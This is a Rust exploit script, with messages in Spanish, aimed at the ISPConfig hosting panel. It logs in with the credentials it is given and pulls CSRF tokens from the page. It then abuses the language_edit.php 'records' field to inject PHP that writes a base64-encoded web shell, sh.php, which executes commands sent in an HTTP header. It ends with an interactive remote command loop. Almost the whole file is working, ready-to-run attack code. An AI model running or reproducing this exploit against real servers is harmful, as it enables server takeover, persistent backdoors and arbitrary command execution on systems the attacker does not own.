use base64::{engine::general_purpose, Engine as _};
use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use regex::Regex;
use reqwest::header::{HeaderMap, HeaderValue};
use reqwest::Client;
use std::env;
use std::io::{self, Write};
use std::process;
use url::Url;

fn validar_url(url: &str) -> Result<String, Box<dyn std::error::Error>> {
    if url.trim().is_empty() {
        return Err("La URL no puede estar vacía".into());
    }

    let url_limpia = url.trim();

    if !url_limpia.starts_with("http://") && !url_limpia.starts_with("https://") {
        return Err("La URL debe comenzar con http:// o https://".into());
    }

    let url_parsed = Url::parse(url_limpia).map_err(|_| "Formato de URL inválido")?;

    if url_parsed.host().is_none() {
        return Err("La URL debe contener un host válido".into());
    }

    let mut url_formateada = url_limpia.to_string();
    if !url_formateada.ends_with('/') {
        url_formateada.push('/');
    }

    Ok(url_formateada)
}

fn validar_usuario(usuario: &str) -> Result<String, Box<dyn std::error::Error>> {
    if usuario.trim().is_empty() {
        return Err("El nombre de usuario no puede estar vacío".into());
    }

    Ok(usuario.trim().to_string())
}

fn validar_contrasena(contrasena: &str) -> Result<String, Box<dyn std::error::Error>> {
    if contrasena.is_empty() {
        return Err("La contraseña no puede estar vacía".into());
    }

    Ok(contrasena.to_string())
}

fn mostrar_reglas_validacion() {
    println!("\nReglas de Validacion:");
    println!("  • URL: Debe comenzar con http:// o https:// y contener un host valido");
    println!("  • Usuario: No puede estar vacio");
    println!("  • Contrasena: No puede estar vacia");
}

async fn iniciar_sesion(
    cliente: &Client,
    url_base: &str,
    usuario: &str,
    contrasena: &str,
) -> Result<Client, Box<dyn std::error::Error>> {
    println!("[+] Iniciando sesión como '{}'", usuario);

    let url_login = format!("{}login/", url_base);
    let datos_login = [
        ("username", usuario),
        ("password", contrasena),
        ("s_mod", "login"),
    ];

    let respuesta = cliente.post(&url_login).form(&datos_login).send().await?;

    let texto_respuesta = respuesta.text().await?;

    if texto_respuesta.contains("Username or Password wrong") {
        eprintln!("[-] Fallo en el inicio de sesión.");
        process::exit(1);
    }

    println!("[+] Inicio de sesión.");
    Ok(cliente.clone())
}

fn extraer_tokens_csrf(
    texto_respuesta: &str,
) -> Result<(String, String), Box<dyn std::error::Error>> {
    let regex_csrf_id = Regex::new(r#"_csrf_id" value="([^"]+)"#)?;
    let regex_csrf_key = Regex::new(r#"_csrf_key" value="([^"]+)"#)?;

    let csrf_id = regex_csrf_id
        .captures(texto_respuesta)
        .and_then(|cap| cap.get(1))
        .map(|m| m.as_str().to_string())
        .ok_or("No se pudo extraer el token CSRF ID")?;

    let csrf_key = regex_csrf_key
        .captures(texto_respuesta)
        .and_then(|cap| cap.get(1))
        .map(|m| m.as_str().to_string())
        .ok_or("No se pudo extraer el token CSRF KEY")?;

    Ok((csrf_id, csrf_key))
}

async fn inyectar_shell(
    cliente: &Client,
    url_base: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("[+] Inyectando shell PHP...");

    let payload_php =
        "<?php print('____'); passthru(base64_decode($_SERVER['HTTP_C'])); print('____'); ?>";
    let payload_codificado = general_purpose::STANDARD.encode(payload_php.as_bytes());

    let payload_final = format!(
        "'];file_put_contents('sh.php',base64_decode('{}'));die;#",
        payload_codificado
    );

    let nombre_archivo: String = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();
    let archivo_lenguaje = format!("{}.lng", nombre_archivo);

    let url_edicion = format!("{}admin/language_edit.php", url_base);

    let datos_iniciales = [
        ("lang", "en"),
        ("module", "help"),
        ("lang_file", &archivo_lenguaje),
    ];

    let respuesta = cliente
        .post(&url_edicion)
        .form(&datos_iniciales)
        .send()
        .await?;

    let texto_respuesta = respuesta.text().await?;
    let (csrf_id, csrf_key) = extraer_tokens_csrf(&texto_respuesta)?;

    let datos_finales = [
        ("lang", "en"),
        ("module", "help"),
        ("lang_file", &archivo_lenguaje),
        ("_csrf_id", &csrf_id),
        ("_csrf_key", &csrf_key),
        ("records[\\]", &payload_final),
    ];

    cliente
        .post(&url_edicion)
        .form(&datos_finales)
        .send()
        .await?;

    println!("[+] Shell descargado en 'sh.php'");
    Ok(())
}

async fn shell_interactiva(
    cliente: &Client,
    url_base: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("[+] Shell web lista. Escribe comandos abajo. Ctrl+C o 'exit' para salir.");
    let url_shell = format!("{}admin/sh.php", url_base);

    loop {
        print!("\nispconfig-shell# ");
        io::stdout().flush()?;

        let mut comando = String::new();
        io::stdin().read_line(&mut comando)?;
        let comando = comando.trim();

        if comando.to_lowercase() == "exit" {
            println!("[+] Adios!");
            break;
        }

        let comando_codificado = general_purpose::STANDARD.encode(comando.as_bytes());

        let mut headers = HeaderMap::new();
        headers.insert("C", HeaderValue::from_str(&comando_codificado)?);

        match cliente.get(&url_shell).headers(headers).send().await {
            Ok(respuesta) => {
                let texto_respuesta = respuesta.text().await?;

                if texto_respuesta.contains("____") {
                    let partes: Vec<&str> = texto_respuesta.split("____").collect();
                    if partes.len() > 1 {
                        println!("{}", partes[1].trim());
                    }
                } else {
                    println!("[-] Sin salida o ejecucion fallida.");
                }
            }
            Err(e) => {
                println!("[-] Error al ejecutar comando: {}", e);
            }
        }
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let argumentos: Vec<String> = env::args().collect();

    if argumentos.len() != 4 {
        eprintln!("Error: Número incorrecto de argumentos");
        eprintln!("Uso: {} <URL> <Usuario> <Contraseña>", argumentos[0]);
        eprintln!("\nEjemplos:");
        eprintln!("  {} https://ejemplo.com admin password123", argumentos[0]);
        eprintln!(
            "  {} http://localhost:8080 usuario123 mi_contraseña",
            argumentos[0]
        );
        mostrar_reglas_validacion();
        process::exit(1);
    }

    println!("[+] Validando parametros de entrada...");

    let url = match validar_url(&argumentos[1]) {
        Ok(url) => {
            println!("[+] URL valida: {}", url);
            url
        }
        Err(e) => {
            eprintln!("[-] Error en la URL: {}", e);
            mostrar_reglas_validacion();
            process::exit(1);
        }
    };

    let usuario = match validar_usuario(&argumentos[2]) {
        Ok(usuario) => {
            println!("[+] Usuario valido: {}", usuario);
            usuario
        }
        Err(e) => {
            eprintln!("[-] Error en el usuario: {}", e);
            mostrar_reglas_validacion();
            process::exit(1);
        }
    };

    let contrasena = match validar_contrasena(&argumentos[3]) {
        Ok(contrasena) => {
            println!("[+] Contrasena valida");
            contrasena
        }
        Err(e) => {
            eprintln!("[-] Error en la contrasena: {}", e);
            mostrar_reglas_validacion();
            process::exit(1);
        }
    };

    let cliente = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let cliente = iniciar_sesion(&cliente, &url, &usuario, &contrasena).await?;
    inyectar_shell(&cliente, &url).await?;
    shell_interactiva(&cliente, &url).await?;

    Ok(())
}
